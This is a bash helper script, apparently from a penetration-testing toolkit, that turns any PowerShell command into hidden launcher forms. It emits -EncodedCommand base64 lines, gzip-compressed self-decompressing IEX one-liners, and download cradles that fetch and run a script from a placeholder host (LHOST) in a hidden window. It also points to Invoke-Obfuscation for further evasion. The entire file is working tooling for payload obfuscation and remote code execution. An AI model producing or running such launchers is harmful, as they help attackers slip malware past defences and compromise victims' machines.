#!/usr/bin/env bash
#
# obfuscate.sh - PowerShell payload encoder / launcher helper
# -----------------------------------------------------------------------------
# Takes a PowerShell command (or -f script.ps1) and emits launcher-ready forms:
#   b64    : UTF-16LE base64 for -EncodedCommand (standard launcher)
#   gzip   : gzip+base64 self-decompressing one-liner (smaller footprint)
#   cradle : IEX download-cradle variants (WebClient / IWR)
# For heavy token-level obfuscation, use the bundled Invoke-Obfuscation repo
# (path printed at the end).
# -----------------------------------------------------------------------------
# AUTHORIZED USE ONLY.
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./obfuscate.sh -c '<powershell command>' [-t b64|gzip|cradle|all] [-u http://host/p.ps1]
#   ./obfuscate.sh -f script.ps1 [-t ...]
#
# DEPENDENCIES: python3 (gzip stage), iconv (UTF-16 for b64).
# -----------------------------------------------------------------------------

set -euo pipefail
c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_hdr(){  printf '\n\033[1;36m# %s\033[0m\n' "$*"; }
have(){ command -v "$1" >/dev/null 2>&1; }

CMD="" FILE="" TYPE="all" URL=""
usage(){ sed -n '2,22p' "$0"; exit 1; }
while getopts "c:f:t:u:h" o; do case "$o" in
  c) CMD=$OPTARG;; f) FILE=$OPTARG;; t) TYPE=$OPTARG;; u) URL=$OPTARG;; *) usage;;
esac; done
[ -n "$FILE" ] && CMD="$(cat "$FILE")"
[ -z "$CMD" ] && { usage; }
show(){ [ "$TYPE" = all ] || [ "$TYPE" = "$1" ]; }

if show b64; then c_hdr "b64 (-EncodedCommand)"
  if have iconv; then
    ENC=$(printf '%s' "$CMD" | iconv -t UTF-16LE | base64 -w0)
    echo "powershell -nop -w hidden -EncodedCommand $ENC"
  else echo "(need iconv for UTF-16LE encoding)"; fi
fi
if show gzip; then c_hdr "gzip+base64 (self-decompressing)"
  if have python3; then
    G=$(printf '%s' "$CMD" | python3 -c 'import sys,gzip,base64,io;b=sys.stdin.buffer.read();o=io.BytesIO();gzip.GzipFile(fileobj=o,mode="wb").write(b);print(base64.b64encode(o.getvalue()).decode())')
    echo "powershell -nop -w hidden -c \"IEX(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream(New-Object IO.MemoryStream(,[Convert]::FromBase64String('$G')),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()\""
  else echo "(need python3 for gzip stage)"; fi
fi
if show cradle; then c_hdr "download cradles"
  U=${URL:-http://LHOST/p.ps1}
  echo "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('$U')\""
  echo "powershell -nop -w hidden -c \"IEX(IWR -UseBasicParsing '$U')\""
  echo "powershell -nop -w hidden -c \"\$c=New-Object Net.WebClient;\$c.Headers.Add('User-Agent','Mozilla');IEX \$c.DownloadString('$U')\""
fi

c_hdr "heavier obfuscation"
echo "Invoke-Obfuscation repo: /opt/tools/windows/ps/Invoke-Obfuscation (run in pwsh/Windows PS)"
echo "  Import-Module ./Invoke-Obfuscation.psd1 ; Invoke-Obfuscation"
